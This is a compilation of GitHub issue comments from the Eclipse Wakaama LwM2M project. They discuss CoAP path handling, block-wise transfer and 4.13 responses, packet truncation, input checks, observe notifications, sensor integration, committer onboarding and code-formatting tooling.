:warning: About Leshan, all documentation is in wiki which is not a so good idea because often documentation and product as same lifecycle, so maybe this is a better idea to store documentation as markdown files with the code.

In #709 I want to use functions from `benntoh` and `htobenn` which clearly fall into the Unix-like category. I agree it might make sense here to have a more portable solution.

Since then, many changes have been done for this project ([liblwm2m](https://github.com/intel/liblwm2m/commits/7b89b54642b23676681aff698a873617e288a9f7/externals/er-coap-13), [wakaama](https://github.com/intel/liblwm2m/commits/master/core/er-coap-13)), but also in Contiki(-NG) ([er-coap-13 folder](https://github.com/contiki-ng/contiki-ng/commits/master/apps/er-coap) (deleted), [erbium folder](https://github.com/contiki-ng/contiki-ng/commits/7d79b69adabd62ec14e31794d858fc7ce8956b2d/apps/erbium) which got moved to [er-coap](https://github.com/contiki-ng/contiki-ng/commits/master/apps/er-coap), and then again to [os/net/app-layer/coap](https://github.com/contiki-ng/contiki-ng/tree/develop/os/net/app-layer/coap)).

This is the core spec and so just explains what happens when `ObjectID` or `ObjectInstanceID` are not used.
Here there is no CoAP concept or  path URI concept involved. 
You need to see how it looks like regarding [transport spec](http://www.openmobilealliance.org/release/LightweightM2M/V1_1_1-20190617-A/HTML-Version/OMA-TS-LightweightM2M_Transport-V1_1_1-20190617-A.html#6-4-2-0-642-Bootstrap-Interface).

> MAY means it is optional. 

This is not my understanding of this ""MAY"".  It seems to me this MAY rather means that you can eventually delete all instance using ""/"".

As I understand the specification usage of ""/"" is the real LWM2M way, I think using an empty path is not allowed.
(an other hint : all example in the spec use ""/"")

> Omitting the path-uri option makes for a slightly smaller message (1 byte) which might be significant

I agree this would be a kind of optimization but it would be out of spec for me.
**If my interpretation is correct,** I suppose using and supporting ""/"" is the right way and so server must use ""/"" and client should only support ""/"". Eventually client could also support no path-uri but this could hide some server misbehavior.

For this last point we face the classic dilemma, ""should we be strict or tolerating"" ? Generally we say ""strict with output"" and ""flexible with input"". But in my experience this is sometime a bad solution because this hide interoperability issue.
So maybe the right way with input is ""strict by default but could be set flexible if needed to support bad implementation"" ?

§3.1 in TS-Core V1.1.1-20190617-A states:

       The key words ""MUST"", ""MUST NOT"", ""REQUIRED"", ""SHALL"", ""SHALL NOT"", ""SHOULD"", ""SHOULD NOT"",
       ""RECOMMENDED"", ""MAY"", and ""OPTIONAL"" in this document are to be interpreted as described in [RFC2119].

From [RFC2119 section 5](https://tools.ietf.org/html/rfc2119#section-5):

       5. MAY   This word, or the adjective ""OPTIONAL"", mean that an item is
       truly optional.  One vendor may choose to include the item because a
       particular marketplace requires it or because the vendor feels that
       it enhances the product while another vendor may omit the same item.
       An implementation which does not include a particular option MUST be
       prepared to interoperate with another implementation which does
       include the option, though perhaps with reduced functionality. In the
       same vein an implementation which does include a particular option
       MUST be prepared to interoperate with another implementation which
       does not include the option (except, of course, for the feature the
       option provides.)

> As I understand the specification usage of ""/"" is the real LWM2M way, I think using an empty path is not allowed.
> (an other hint : all example in the spec use ""/"")

According to [RFC7252 section 6.4 ""Decomposing URIs into Options""](https://tools.ietf.org/html/rfc7252#section-6.4) step 8:

       8. If the value of the <path> component of |url| is empty or
       consists of a single slash character (U+002F SOLIDUS ""/""), then
       move to the next step.

       Otherwise, for each segment in the <path> component, include a
       Uri-Path Option and let that option's value be the segment (not
       including the delimiting slash characters) after converting each
       percent-encoding (""%"" followed by two hexadecimal digits) to the
       corresponding byte.
And then [section 6.5 ""Composing URIs from Options""](https://tools.ietf.org/html/rfc7252#section-6.5) steps 6 & 7:

        6. Let |resource name| be the empty string.  For each Uri-Path
        Option in the request, append a single character U+002F SOLIDUS
        (/) followed by the option's value to |resource name|, after
        converting any character that is not either in the ""unreserved""
        set, in the ""sub-delims"" set, a U+003A COLON (:) character, or a
        U+0040 COMMERCIAL AT (@) character to its percent-encoded form.

        7.   If |resource name| is the empty string, set it to a single
        character U+002F SOLIDUS (/).
So for CoAP, following the standard means not sending the Uri-Path Option for a path of ""/"". On reception, if only one Uri-Path Option is present and empty it is equivalent to not being present and will be ""/"".

We are already sending it properly by not including the Uri-Path Option.

On the receiving side, uri_decode() in uri,c has this, which will handle it either way:

        if (NULL == uriPath || uriPath->len == 0)
        {
            return LWM2M_REQUEST_TYPE_DELETE_ALL;
        }

I don't think there is any change needed.","{""url"": ""https://api.github.com/repos/eclipse-wakaama/wakaama/issues/comments/MDEyOklzc3VlQ29tbWVudDczNjU0MTAxNQ==/reactions"", ""total_count"": 0, ""+1"": 0, ""-1"": 0, ""laugh"": 0, ""hooray"": 0, ""confused"": 0, ""heart"": 0, ""rocket"": 0, ""eyes"": 0}"

I agree with your analysis. It is (imho) not obvious though that a uriP NULL pointer will not cause a crash. Can we formulate some kind of policy for when to check pointers?

First I tried to define if opened issues are enhancement, bug or question and labelled  it in consequence.
For question, I tried to get some feedback from users and If I didn't get any answer after something like 1 month, I close and invite to reopen if needed.

**For old issue**, maybe the team should have a look, especially the ones which are labelled as ""bug""  to see if bugs still exists or should be fixed. (But I guess this should be done after we merge all PR ? :thinking:)

**For recent issues**, it would be good if the team could answer in _""short""_ delay most of the time.
This shows that project is active and rewards user which takes time to give us feedback.
Generally there is not so much issue by days, so maybe taking few minutes by days is a good way and avoid to accumulate too many issues. I talked about answering not fixing or implementing  user request immediately. 
For easy to fix bug, being reactive could worth as those also show that project is really active and bring confidence.
Of course this is a open source project and so this is best effort and by the way I encourage to keep a rhythm that you could keep at long term.

About,

I think a client which does not support TLV should seriously consider to use `prefered content format`. (I don't know why this is not mandatory?)
My Idea about using Discover Request does not help so much because there is no mandatory ""multi value"" Content format in LWM2M 1.1 ... (I just discover this reading the spec again)

```
The LwM2M Client MUST support plain text, opaque, and CoRE Link data formats and
 it SHOULD support at least one of SenML CBOR or SenML JSON data formats. 
```

So your idea about processing error response and trying a different format is probably the only way ? :thinking: 

In LWM2M 1.0 the server and the client MUST support TLV and TLV can be used for almost all needs. (single value, opaque, multi value) it seems to me this was really better for interoperability ? Now in LWM2M 1.1 it's more difficult to know which content format must be used by default ? I'm talking about bootstrap but also LWM2M server, or maybe I missed something ?

When sending packets the #define is not used and memory is allocated dynamically using malloc() allowing very large packets to be sent.
Hands on testing shows that
a) this is less of an issue with blocktransfer in place (packets are kept sufficiently small provided both parties support blocktransfer)
b) it is possible to send very large packets (if TLV is used, SENML has another limitation #526), but they are not accepted by the leshan server used.

Current best thinking (on my part) is to extend the receive buffer to `uint8_t buffer[MAX_PACKET_SIZE+1];` and check if this number of bytes is received the packet is dropped (better than corrupting data).

The title is misleading (I wrote it 😂). The concern is that the wakaama client and server truncate all **_received_** UDP payloads to MAX_PACKET_SIZE. There is also a truncation of command line input, arguably less of a concern.

Context matters, is it a request or a response that is being truncated, what format is being used. E.g. TLV might cause loss of information while SENML should cause parsing error and be detected. Blocktransfer should reduce the risk of this limit causing a problem.
No clear suggestion on how this should be addressed, if it needs to be. Dropping packets is easy, will prevent ""corruption"" in the TLV case mentioned but will prevent the ""parsing error"" detection if SENML.

When we receive message larger than this buffer, the CoAP specification gives some good hint : 
>  If an implementation is too constrained to allow for allocating the
      above-mentioned upper bound, it could apply the following
      implementation strategy for messages not using DTLS security:
      Implementations receiving a datagram into a buffer that is too
      small are usually able to determine if the trailing portion of a
      datagram was discarded and to retrieve the initial portion.  So,
      at least the CoAP header and options, if not all of the payload,
      are likely to fit within the buffer.  A server can thus fully
      interpret a request and return a 4.13 (Request Entity Too Large;
      see Section 5.9.2.9) Response Code if the payload was truncated.
      A client sending an idempotent request and receiving a response
      larger than would fit in the buffer can repeat the request with a
      suitable value for the Block Option [BLOCK].
      
(at the end of https://tools.ietf.org/html/rfc7252#section-4.6)

Some ideas,  from an ideal world solution to the easier way : 
1. fallback to block transfer : for received request : use 4.13 + block option, for received response  : retry the request with block transfer
2. just notify issue : for received request : use 4.13, for received response : return error to the upper/application layer.
3. just ignore + logs","{""url"": ""https://api.github.com/repos/eclipse-wakaama/wakaama/issues/comments/MDEyOklzc3VlQ29tbWVudDc2OTgyMzM4NA==/reactions"", ""total_count"": 0, ""+1"": 0, ""-1"": 0, ""laugh"": 0, ""hooray"": 0, ""confused"": 0, ""heart"": 0, ""rocket"": 0, ""eyes"": 0}"

Another concern was what would happen to the remaining data after a truncated packet is read from the socket. My understanding (and some practical tests) is that UDP sockets contrary to TCP discard the remaining bytes.

We should investigate the reason of this (capture should help)
Californium should be able to handle this and adapt its blocksize.
(you can also change the prefered_block_size in Leshan, if you want to test if it works without size negotiation, in `californium.properties` if you run Leshan locally)

I tried to understand the capture. For now I see that **Wakaama** return a `4.13 Request Entity Too Large` with `Block Size: 128` but no negotiation was done.

In the capture wireshark display `Block Size: 128` which is not so clear but it seems the option type is **28** which is `Size2` option.
I think it's not OK as `Size2` is for response ( see https://tools.ietf.org/html/rfc7959#section-4)

Nope, this is not the case. Here Leshan try to send a request (PUT) using block1 with block size 512.
We agree that we want to negotiate the block size. (this makes sense because https://github.com/eclipse/wakaama/issues/510#issuecomment-740966671 confirm that if block size 128 was used this will work, I suppose there is a limited buffer size in wakaama which is OK)

My understanding of the specification is that wakaama should answer with a 4.13 with block1+szx 128.
This is confirmed by this mail : https://mailarchive.ietf.org/arch/msg/core/tyEr_LY_jHquT3SqAIGQbi5P7dI/ from Carsten Bormann which is the author of the RFC.
> I would expect that the server should send the desired block size if it wants the client to change from the block size it used, so 4.13 + Block1. 

It also confirms that size1 is about the whole payload before we split it in block :

I think this is possible way and it was my understanding of the specification at the begining.
But as it sounded a bit silly to me because server should know the desired block size and so should ask for this size directly.
I finally asked [this](https://mailarchive.ietf.org/arch/msg/core/BfOlcS_BpNXbksfjzz6iGpEa_SQ/) to ietf **core** working group :

And I get the [answer above](https://mailarchive.ietf.org/arch/msg/core/tyEr_LY_jHquT3SqAIGQbi5P7dI/) from Carsten which make me think that block1+szx could(should?) be used.

None of these makes sense if we are not in a block1 context where we reply to a block 1 request. As far as I can tell these two are only discussed in the context of a 2.xx response. I also noted this in section 2.5 of the rfc 7959. 

The error code 4.13 (Request Entity Too Large) can be returned at any
time by a server that does not currently have the resources to store
blocks for a block-wise request payload transfer that it would intend
to implement in an atomic fashion.  (Note that a 4.13 response to a
request that does not employ Block1 is a hint for the client to try
sending Block1, and a 4.13 response with a smaller SZX in its Block1
Option than requested is a hint to try a smaller SZX.)

The first part is of course not what we discuss here, but the second part, even though it does not directly contradict what Carsten answered you, it does imply that a block 1 option is not part of the response if the request wasn't a a block1 request.

Maybe the response should be

- block 1 request: 4.13 + block1 option (num = 0 (mirrored from the request but it should be 0 as this only happens for the first reques i guess), m = true, prefered szx) 
- not a block 1 request: 4.13

As I interpret 7959 this would be the correct response, but the end result could be two consecutive 4.13 to make a successful transfer, first a 4.13 to hint a retry with block transfer and then a 4.13 + block 1 option to hint retry block transfer with a different szx.

I could of corse respond  4.13 + block1 option (num = 0, m = true, szx) to a non block transfer request, but I feel this is not right, there is no block option I am responding to and no block 0. Despite the incorrectness of block num 0, I actuallty think this is a better solution but I cant escape a nagging feeling that this is a deviation from what the rfc actually says.

Should we run this through ieft a second time to make sure we get it right?

I think you should not worry too much about this, because we have pretty much the same thing with [pre-negotiation of block2](https://tools.ietf.org/html/rfc7959#section-2.4). 
```
   To influence the block size used in a response, the requester MAY

No problem to me if you want to get more clarification about that. But keep in mind that getting an answer is not guarantee or sometime takes a long time. So I don't advice to wait the answer to finish #461. (I mean I recommend we choose a solution and eventually we change it later, if needed)

I agree it is not so clear ... 
I think you right to not accept easily to do something which seems to you ""out of RFC"". 
Unfortunately, in my experience, this is not the first time a RFC sounds not so clear to me. Sometime we even find thing which looks to contradiction (e.g. : https://mailarchive.ietf.org/arch/msg/tls/rQ3El3ROKTN0rpzhRpJCaKOrUyU/)

Ok (as before). See log.

Not ok - ""Internal server error"" (did read on 31024/10 not 31024/10/5), see log.

My suggestions:
1. `dataP` should be checked before being accessed and if set to `NULL` the function should return `COAP_400_BAD_REQUEST`. (same for `size`)

We are talking about SENML JSON OR OLD JSON content format right used for CREATE request?

Not so easy question. 
Mainly because create request target an object (not an object instance) and so if there is no record  we don't know the object instance ID to use for the new instance.
You could say that you let device choose the ID. This is what we do in Leshan, but recently I discover that letting device choose ID with those formats was not allowed ( (see https://github.com/OpenMobileAlliance/OMA_LwM2M_for_Developers/issues/422#issuecomment-747344840)), so I'm not sure Leshan implement the right behavior. 

Currently I would say this is not a valid payload and maybe Leshan should not allow this.

Unless I missed something, I think you're right and we should : 
1. check inputs to avoid this kind of seg fault.
2. AND/OR clearly defined function contract (e.g. allowed value for function arguments)

Sometime 2) is enough but It could be less bug resilient and is not adapted when inputs come from ""uncontrolled"" source (like a foreign peer or a user)","{""url"": ""https://api.github.com/repos/eclipse-wakaama/wakaama/issues/comments/MDEyOklzc3VlQ29tbWVudDc2MDc3NzQ4NQ==/reactions"", ""total_count"": 0, ""+1"": 0, ""-1"": 0, ""laugh"": 0, ""hooray"": 0, ""confused"": 0, ""heart"": 0, ""rocket"": 0, ""eyes"": 0}"

This function parses SENML/JSON/... and returns a list of length `size` of tree data structures `lwm2m_data_t`

- size > 0 indicate successful parsing e.g. `create 0 /123 [{""bn"":""/123/"",""n"":""6/2"",""v"":69}]`
- size <= indicate unsuccessful parsing or contradicting URI information (including instance) e.g. </br> `create 0 /123 [{""bn"":""/124/"",""n"":""6/2"",""v"":69}]`  or </br> `create 0 /123/7 [{""bn"":""/123/"",""n"":""6/2"",""v"":69}]`. Other checks are also made.
- the tree (or list of trees) returned does not duplicate the `&uri` information e.g. </br>  `create 0 /123 [{""bn"":""/123/"",""n"":""6/2"",""v"":69}]` creates a tree of depth 2 with a `LWM2M_TYPE_OBJECT_INSTANCE` node and a `LWM2M_TYPE_UNSIGNED_INTEGER` child node while </br> `create 0 /123/6 [{""bn"":""/123/"",""n"":""6/2"",""v"":69}]` only creates a tree with a `LWM2M_TYPE_UNSIGNED_INTEGER` node

`prv_create_client(...)` use `lwm2m_data_parse()` and special handling of object 31024 to attempt to build a tree. 

I propose the code introduce a check here that returns an error if `size < 0`, this will however disqualify `create 0 /123 {}` as valid input, but it is not valid SENML/lwm2m JSON is it?

After this point the code checks if `&uri` contains instance information and if it does a new tree top node of type   `LWM2M_TYPE_OBJECT_INSTANCE` is created with the list of trees as children. 
Finally` lwm2m_dm_create()` is called.

Quick suggestions (respons might be a bit shorter/slower right now due to holidays for many active users including myself :)
- check what encoding is being used in Leshan (drop down in the top right of the web page). The wakaama client no longer support TLV since it now is aiming towards lwm2m 1.1 compatibility. Choose a json format
- try building/running the wakaama server locally.
- try downloading and running the leshan server locally
- (if you are familiar with it) check communication with wireshark.

I also got few questions,
1. How to identify the object name like this one 3303 was referred to newTempObj?
2. The file object_temperature.c was created into the client folder, so we should edit this file to map the real sensor data value?
3. What does this command line do? ""git log --pretty=oneline -2""?
4. Should we check if the object is supported in client? or all the objects listed [here](http://www.openmobilealliance.org/wp/OMNA/LwM2M/LwM2MRegistry.html) will support by default?

1. `newTempObj` is only used as a branch name in git, it is not used in the source code. If you ""diff"" the `newTempObj` branch vs the `master` branch you can review the changes made to add support for 3303. This is a great way to learn!
2. Yes
3. It just prints out git log history in a compact way to verify that the commit `Add basic temperature object 3303` is present

It is a collection of C-files that can be imported to an IDE/editor of your choice.

You are mixing C and C++, this can get complicated. I pushed a commit `Demonstrate use of C++` to the same repo/branch as before `https://github.com/qleisan/wakaama.git` / `newTempObj ` that demonstrates how this can be done in a simple scenario. This should cover the foundation of what you need to do.

Somewhat simplified, you need to enable `project (lwm2mclient C CXX)` and use `extern ""C""`

`git clone https://github.com/qleisan/wakaama.git`
`cd wakaama/`
`git checkout newTempObj`
`cmake examples/client -B build-client`
`cd build-client`
`make`
`./lwm2mclient -4 -n client3303 -h leshan.eclipseprojects.io`

Go to [https://leshan.eclipseprojects.io/#/clients/client3303](https://leshan.eclipseprojects.io/#/clients/client3303) select ""senml_json"" in (single-value) dropdown. You should be able to click ""Sensor Value"" and get a (fake) reading back.

(support LWM2M 1.0 or not, maintaining v1.0 or NOT, breaking API or not.)

About ""providing a better abstraction/interface for a new user that wants to add a new object"", maybe a dedicated issue could be created where we list what are problem of the current API and how a new one could help to solve it (or something like this).

for the observe operation in the server, currently only one `lwm2m_result_callback_t` callback is used. It is called once for the result of the observe request, but then afterwards for each notify message. The arguments of the callback have different semantics depending when it was called.
For a successful ""observe request result"" the status is set to 0, but the subsequent notifies set the status field to the notify counter (COAP ""Observe"" option value).
Splitting this into two callbacks or having separate fields for status and the counter value would help here. 
Also, the counter value is not available in the request result, albeit it should be always 1.

We should not answer to a response with a response. You can not send a 4.13 in response to a 2.05.
I mean 4.13 is [client response code](https://tools.ietf.org/html/rfc7252#section-5.9.2).
So there is maybe a first issue here. (or maybe I don't get you?)

> If the client does not handle the block2 GET correctly and again send a too large payload this results in an endless loop.

It sounds there is another issue here.

I guess this could be resolved like this.
- IF server receive a too big payload to a request sent **without block2** option THEN it could retry with block2 option.
- IF server receive a too big payload to a request sent **with block2** option THEN it should consider there is nothing to do and so report the error to application layer.

I guess this should avoid the infinite loop ? :thinking:

This means the server should ignore the (too big) 2.05 response and only issue a new GET request with block2 set to `REST_MAX_CHUNK_SIZE`?

About your suggestions:
1. I agree, the server should indicate its block size with a second GET request.
2. If the client sends a block2 with a too big payload the server can still indicate its max. payload size with the block2 option. And hope the client can handle it correctly.

However after signaling its block size once, the server should stop trying and report an error.","{""url"": ""https://api.github.com/repos/eclipse-wakaama/wakaama/issues/comments/MDEyOklzc3VlQ29tbWVudDc3NTk5OTY4Mg==/reactions"", ""total_count"": 0, ""+1"": 0, ""-1"": 0, ""laugh"": 0, ""hooray"": 0, ""confused"": 0, ""heart"": 0, ""rocket"": 0, ""eyes"": 0}"

Generally this is better for analyzing to join the capture instead of a screenshot.

Looking at the screenshot, I see that I didn't understand your first point correctly.
The 4.13 is a response for the second GET request,  not a response for the 2.05 content response. So there is no issue here.

So it remains only the infinite GET issue.

Sorry for confusion, but this change my understanding again about the first point :sweat_smile: ...
My first guess was right, there is an issue with the 4.13. It must not be send by the server when receiving a too big response. (unfortunately, I think there is no way in CoAP to inform the client in this case)

About the second point (infinite loop), 
Regarding the [RFC7959](https://tools.ietf.org/html/rfc7959#section-2.4) :
> To influence the block size used in a response, the requester MAY
   also use the Block2 Option on the initial request, giving the desired
   size, a block number of zero and an M bit of zero. A _""CoAP""_ server (_""in our case LWM2M client""_) MUST use
   the block size indicated or a smaller size.
   
I think behavior defined in https://github.com/eclipse/wakaama/issues/536#issuecomment-775965260 should be OK
- IF server receive a too big payload to a request sent without block2 option THEN it could retry with block2 option.
- IF server receive a too big payload to a request sent with block2 option THEN it should consider there is nothing to do and so report the error to application layer.

 If device can not use block2 option and payload is still too big, I think there is nothing more to do. This prevent infinite loop and avoid the need to add a new state (a kind of counter).

This is my understanding. Just sending the ACK. The ACK just means I get your message (response or request) nothing else more. Seperate response does not change that we can not answer to a response with a response so if we can not handle it, we just ignore it. The Foreign peer will not be aware we can handle it.
(optional) Ideally Wakaama should raise to the upper layer that it received a response it is not able to handle.

I suggest having a block information structure in every callback which keeps track on the block transfer and is NULL if the callback results from a non-block transfer. Something like:

E.g. currently, on the server side, each implementation (examples and custom builds) have to handle the raw buffer. The buffer can contain all different content formats and parsing has to be implemented for each new application.
There is already the `lwm2m_data_t` structure in place which can hold IPSO objects independently of the content format in a tree structure. Also functions like `lwm2m_data_parse` and `lwm2m_data_serialize` are available. However they are a bit cumbersome to use, partly because in addition to the pointer to the structure there is also the size variable which have to be tracked. A clean interface would help a lot.

Some ideas:
* Modify the result callback to hide the raw buffer and do the parsing before the call (this assumes that all chunks of a block transfer can fit in memory):
```
typedef void (*lwm2m_result_callback_t) (uint16_t clientID, lwm2m_uri_t * uriP, int status, block_info_t * block_info, lwm2m_media_type_t format, uint8_t * data, int dataLength, void * userData);
```
<->
```
typedef void (*lwm2m_result_callback_t) (uint16_t clientID, lwm2m_uri_t * uriP, int status, block_info_t * block_info, lwm2m_data_t * lwm2m_data, int size, void * userData);
```
* Use a single structure which holds all important data like uri, parsed tree, size, status etc.
* As described in #521 the interface is already misused to report the notify counter via the status field.
* The callback should still allow access to the raw buffer if needed
  * If the chunks of a block transfer have to be treated individually
  * If parsing fails and custom parsing is needed
* It should be possible to disable the parsing (at build time?) due to memory concerns

This may imply major changes, so this issue is intended to collect and discuss ideas on how to improve the overall usability.

In Leshan, I'm not totally satisfy of the API but we have an object which defined the ""Identity"" of the peer which do the ""request"".

I am using a dht22 (temperature and humidity) sensor. I found these file dht22.c & dht22.h [link](https://github.com/Filkolev/DHT22-sensor-driver).

[dht22.zip](https://github.com/eclipse/wakaama/files/6067180/dht22.zip)
[dht22_h.zip](https://github.com/eclipse/wakaama/files/6067183/dht22_h.zip)

They have used the linux header files to access the GPIO and IRQ signals (as I understand).

So I imported the files into the ..%wakaama/examples/client folder and modified the Object_Temperature.c

[object_temperature_c.zip](https://github.com/eclipse/wakaama/files/6067196/object_temperature_c.zip)

The first time when I try to compile using cMake ana Make I received an error ""linux/hrtimer"".

So I googled for commands to install the linux drivers and found this, https://www.raspberrypi.org/documentation/linux/kernel/headers.md

sudo apt install raspberrypi-kernel-headers

![2021-03-02-033138_1920x1080_scrot](https://user-images.githubusercontent.com/76512837/109620495-f1ffe900-7b07-11eb-8ef8-27ee7691d608.png)

After installing the linux drivers I tried to compile the code again. But this time the header files are not identifiable, so I copied the include folder to the client folder of ..wakaama / examples.

Still there was a dependency issues.

Kindly let me know if you need more details on the same.

2) integrate the working sensor read program with the wakaama stack

Do you really have to use a kernel driver (things can get very complicated)? When I googled there were user space alternatives, C code and python. [This](https://pimylifeup.com/raspberry-pi-humidity-sensor-dht22/) python tutorial looks promising. If it works you can either move on to test a C program that does the same thing or start working on ""integration""

If you get a C program working reading the sensor data integration will probably be more straightforward. If you use python you will have to share sensor data in probably more complex way but since you are on a linux system there are many possibilities.

I can't really help you with the sensor part, but I will try to help you with the integration once you have a working solution.

Is it `humidity, temperature = Adafruit_DHT.read_retry(22,17)` that you expect to have working?

You could then write the temperature information to a file that is regularly read from your wakaama code (probably easier) or maybe call the python program directly from the wakaama code.

For Wakaama I would prefer to keep it simple and always report the latest value.

This is about a LWM2M firmware update implementation at LWM2M server side based on observe to watch the state (/5/x/3) resource. 

Notification is just best effort to synchronize a resource between CoAP client and server meaning that :
 -  some notification can be lost.
  - notification order is not guarantee and CoAP client (LWM2M server in this case) implementation generally just drop older notification. (see [rfc7641#section-3.4](https://tools.ietf.org/html/rfc7641#section-3.4))
  
> It is expected that all states are reported to the server however this is not the case.

So my understanding is that you can not rely on observe to receive all the state.
Observe can just be used as a kind of optimization to reduce latency but the implementation must be designed to work even if you never receive any notification.

In my experience  observation bring lot complexity and so I can imagine LWM2M device which does not support it and so this is another reason to not rely (exclusively?) on observe for firmware update.

> But are they guaranteed to be sent 

At LWM2M server side, we don't care if there are guaranteed to be sent as they are not guaranteed to be received :)

> or is it the latest available observation value that is sent when ""pmin"" expires? 

LWM2M pmin [is inspired](https://github.com/OpenMobileAlliance/OMA_LwM2M_for_Developers/issues/461#issuecomment-483554012) by [draft-ietf-core-dynlink-13#section-3.2.1](https://tools.ietf.org/html/draft-ietf-core-dynlink-13#section-3.2.1) and it says that : 
```
   When present, the minimum period indicates the minimum time, in
   seconds, between two consecutive notifications (whether or not the
   resource state has changed) ...
   A (CoAP) server MAY update the resource state with the last sampled value
   that occured during the pmin interval, after the pmin interval
   expires.
```
[The author described it like this](https://github.com/OpenMobileAlliance/OMA_LwM2M_for_Developers/issues/461#issuecomment-484158705) : 
_""""Regardless of whether the value of the resource changes or not, do not send me its value any quicker than what I have specified for pmin"".""_

And knowing that CoAP observation spirit is more about trying to sync the ""most recent state"" than caring about a ""complete history"" (see https://github.com/eclipse/leshan/wiki/LWM2M-Observe#the-spirit-of-observe-feature), I would say that this is the lastest available observation value. 

> I.e. are they supposed to be queued so that (in this case) no state transition is lost (or rather not sent) due to fast transitions...?

For reason exposed above, I think queuing it does not make so much sense.

I can see another problem with queuing it. Imagine a pmin set to 10s and the resource state change each 5s.
You can send only 1 notify each 10s but you will queue 2 value each 10s, it sounds not so good.

- packets can always be lost, server side needs to have a timeout/polling mechanism to deal with missing, out-of-order for key pieces of information e.g. firmware update state info. This is (of course) being worked on for the system discussed.
- to send a notification the client application must call `lwm2m_resource_value_changed()` and then `lwm2m_step()`.
- default behavior of the wakaama client/server is to send notifications immediately when `lwm2m_step()` is called. This can be altered by using pmin, pmax and other attributes
- default behavior of the wakaama client/server is to send non-confirmable coap messages for notify
- LwM2M **1.2** Core spec (5.1.2 Attributes Classification) allows for per resource control of confirmable/non-confirmable notify

From what I saw until now, I feel all people mentioned above showed enough investment in this project and also have the cooperative mindset needed to be committer. :+1: We will see if  PMC agree with this. 

@rettichschnidi is OK to be committer. 
@qleisan , @tuve, @mlasch is it something you would like too (I'm mean to be a committer on Wakaama project) ? 

Does your employer sounds OK with this idea ?

About, legal paper work, I'm not 100% sure but : 
Each committer will have to accept the terms of the [Eclipse Contributor Agreement](https://www.eclipse.org/legal/ECA.php) electronically (ECA) and to provide a signed Eclipse [Individual Committer Agreement](https://www.eclipse.org/legal/committer_process/EclipseIndividualCommitterAgreement.pdf) (ICA).  (Note that as contributor you probably already accept the ECA).  The legal department of your company will likely want to review the ECA and ICA  before you sign. 

Alternatively, if your organization becomes a member of the Eclipse Foundation, all of your company's employees can be covered by a [Member Committer and Contributor Agreement](https://www.eclipse.org/legal/committer_process/EclipseMemberCommitterAgreement.pdf). If your company is interested by being an Eclipse Member, you should contact [Frédéric Desbiens](mailto:frederic.desbiens@eclipse-foundation.org) / @fdesbiens.

Just to in case I share [this post](https://blogs.eclipse.org/post/wayne-beaton/becoming-eclipse-committer) which explains a little bit the role and responsibility of committers.
For [more details](https://www.eclipse.org/projects/handbook/#contributing-committers).

@rettichschnidi, if you are several in same company maybe it worth to sign a  [Member Committer and Contributor Agreement](https://www.eclipse.org/legal/committer_process/EclipseMemberCommitterAgreement.pdf), I advice you to discuss about this with @fdesbiens.

I don't know exactly how this address is used but AFIAK I don't think that this address will be used for mailing list automatically. Meaning that if you don't want to subscribe or use another address this should be possible (:warning: I'm clearly not 100% sure)

It's a good question :thinking:. 
Stop contributing at some time is ""normal"" for an committer. So I would say this should not be an issue, in the other hand if you think this is possible that you stop investing time in 1 or 2 month maybe it isn't worth all the paperwork . :grin:.

I will try to get some advice about this from eclipse.

This should be applied to all possible contributors. Of course this must not conflict with any eclipse rules. 

Previously there is nothing clear about long term engagement, so I don't know if we should apply it now. Anyway,  this is maybe something that team should clarify at mid-term.

Concerning you about being committer : 
 - Regarding you previous contribution, I feel you deserve it as much as the others,
 - But **you should be comfortable with the idea** and  if you prefer to stay contributor for now, it's OK. 

In a practical way :
 - if you think this is possible you stop to contribute in 1 or 2 month, this maybe doesn't worth the paperwork.
 - do you know what could give you more visibility about a longer-term commitment on the project  ?

Therefore, every file looks slightly different, making it more hard than necessary to read the code, figuring out and sticking to the predominant style.

Therefore, for C code I propose to pick clang-format (version 10 for now), using a code style close to the one LLVM, the creators of clang-format, use. Foreseeable adaptions might be:
- IndentWidth: 4 (instead of 2)
- ColumnLimit: 120 (instead of 80; current often oversteps the 80 characters boundary)

For CMake files, https://github.com/cheshirekow/cmake_format seems to be the tool to pick.

Acceptance criteria:
- Changes must be done in commits which are limited exclusively to cosmetic/style changes
- Above commit id(s) can be stored in a [--ignore-revs-file](https://git-scm.com/docs/git-blame#Documentation/git-blame.txt---ignore-revs-fileltfilegt) file (supported since Git 2.23).
- GitHub Action in place to prevent merging of non-formatted code
- Tools and exact versions to use defined
- Files in coap/er-coap-13 (and examples/shared/tinydtls) should not be touched
- <s>Code and comments checked for being garbled, exceptions in place where sensible</s> did not format the whole code base

Since most of the CMake code got changed for #653, I went on to reformat all files, and therefore it will be possible to just run cmake-format on all CMake files like this:

```bash
git ls-files '*CMakeLists.txt' '*.cmake' | xargs cmake-lint

For the technical part, my suggestion would be:
* Developer documentation: [Sphinx](https://www.sphinx-doc.org/)
  * Built for every commit, available as artifact
  * Most recent build for master deployed to https://www.eclipse.org/wakaama/ (or a subdirectory?)
* Source code: [Doxygen](https://www.doxygen.nl/)
  * Built for every commit, available as artifact
  * Most recent build for master deployed to https://www.eclipse.org/wakaama/doxygen (?)

Initial Content:
* Content of README.md (which needs to be reworked then to make sense again)
* examples/bootstrap_server/README
* Unsure if sensible: Landing page currently hosted at https://www.eclipse.org/wakaama/ (updated where necessary)
* Some examples for stuff we have already and will be discussing in the meantime.

The structure of the documentation I have no idea yet, but I think we can discuss this once the technical aspects have been agreed on and resolved (minus the deployment part).

Since PR #573 we are running SonarCloud analysis on branches in this repository. And only on those.

Analyzing PRs from forks is disabled due to security problems. See [SonarCloud analyses external PR](https://jira.sonarsource.com/browse/MMF-1371) and for details.

While secure, this leaves us with the chance of breaking master as it has happened for PR #590 and the resulting commit 8218ddcffedc0b549ddf8ef42b6e6e541985eb1b.

The later we should probably not use as we try to produce nicely crafted commits in the first place and GitHub adjust the subject line, [adding the PR number](https://github.com/eclipse/wakaama/commit/54d6c2b165f1edd440d6620240aa9ddf99cb8071), therefore potentially violating the 72 character rule commanded by Eclipse.

The ""Create a merge commit"" option however is greyed out, essentially forcing all PRs to be rebased when merging. Rebasing in turn causes the ID of all merged commits to change, rendering the [.git-blame-ignore-revs](https://github.com/eclipse/wakaama/blob/54d6c2b165f1edd440d6620240aa9ddf99cb8071/.git-blame-ignore-revs) useless/broken.

My questions therefore:

* Can we disable the option ""Squash and merge""?

Same here, but not necessarily at all costs. Keeping `git blame` useful while allowing for cosmetic changes in existing code is something I value more.

